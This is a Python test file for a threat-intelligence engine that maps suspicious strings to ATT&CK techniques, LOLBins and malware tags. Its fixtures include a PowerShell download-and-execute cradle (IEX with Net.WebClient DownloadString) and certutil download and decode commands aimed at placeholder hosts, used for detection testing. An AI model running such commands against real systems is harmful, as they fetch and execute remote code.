from titan_decoder.threat_intel import ThreatIntelligenceEngine


def test_powershell_downloader_maps_attack_lolbin_and_tags():
    report = {
        "nodes": [{
            "id": 3,
            "content_preview": (
                "powershell.exe -enc AAAA; "
                "IEX(New-Object Net.WebClient).DownloadString"
                "('https://example.test/a')"
            ),
        }],
        "iocs": {"urls": ["https://example.test/a"]},
    }
    result = ThreatIntelligenceEngine().analyze(report)
    ids = {item["technique_id"] for item in result["techniques"]}
    assert {"T1059.001", "T1105", "T1027"} <= ids
    assert result["lolbins"][0]["executable"] == "powershell.exe"
    assert {"downloader-like", "script-stager-like"} <= {
        item["tag"] for item in result["malware_tags"]
    }
    assert result["confidence"] > 0.5


def test_threat_intelligence_is_deterministic():
    report = {
        "nodes": [
            {"id": 1, "content_preview": "certutil -urlcache -f https://x.test/a a.bin"},
            {"id": 2, "content_preview": "certutil -decode a.txt a.bin"},
        ],
        "iocs": {"urls": ["https://x.test/a"]},
    }
    engine = ThreatIntelligenceEngine()
    assert engine.analyze(report) == engine.analyze(report)


def test_detection_metadata_can_supply_attack_ids():
    result = ThreatIntelligenceEngine().analyze(
        {"nodes": []},
        detections=[{"id": "fixture", "attack_ids": ["T1003"]}],
    )
    assert [item["technique_id"] for item in result["techniques"]] == ["T1003"]


def test_clean_input_produces_empty_assessment():
    result = ThreatIntelligenceEngine().analyze({"nodes": [], "iocs": {}})
    assert result["techniques"] == []
    assert result["lolbins"] == []
    assert result["malware_tags"] == []
    assert result["confidence"] == 0.0
